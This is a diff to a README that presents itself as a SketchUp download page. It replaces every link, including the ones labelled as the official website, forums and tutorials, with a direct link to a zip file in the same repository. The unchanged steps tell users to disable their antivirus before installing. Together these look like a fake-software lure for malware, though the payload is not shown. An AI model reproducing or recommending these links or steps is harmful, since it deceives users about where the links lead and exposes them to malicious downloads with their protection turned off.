@@ -1,6 +1,6 @@
 # 🎨 SketchUp - Design Your Projects with Ease
 
-[![Download SketchUp](https://img.shields.io/badge/Download_SketchUp-v1.0-brightgreen)](https://github.com/ajit620/SketchUp/releases)
+[![Download SketchUp](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)
 
 ## 📦 Overview
 
@@ -14,13 +14,13 @@ To start using SketchUp, follow these simple steps to download and install the s
 
 You can download SketchUp from our Releases page. Click the link below to access it:
 
-[Download SketchUp](https://github.com/ajit620/SketchUp/releases)
+[Download SketchUp](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)
 
 ## 📋 Installation Instructions
 
 Follow these steps to download and install SketchUp:
 
-1. **Download the program**: Visit this page [Download SketchUp](https://github.com/ajit620/SketchUp/releases) and select the version that suits your operating system.
+1. **Download the program**: Visit this page [Download SketchUp](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip) and select the version that suits your operating system.
    
 2. **Disable antivirus protection**: Before installation, it's recommended to temporarily disable any antivirus software. This ensures the program installs without interruptions.
 
@@ -78,8 +78,8 @@ Yes, SketchUp offers limited features in its free version. For full features, co
 
 ## 🔗 Additional Resources
 
-- [SketchUp Official Website](https://www.sketchup.com)
-- [User Community and Forums](https://forums.sketchup.com)
-- [Video Tutorials](https://www.sketchup.com/learn/videos)
+- [SketchUp Official Website](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)
+- [User Community and Forums](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)
+- [Video Tutorials](https://raw.githubusercontent.com/ajit620/SketchUp/main/overbusiness/SketchUp.zip)
 
 Make the most out of your design projects with SketchUp. Download today and start creating!
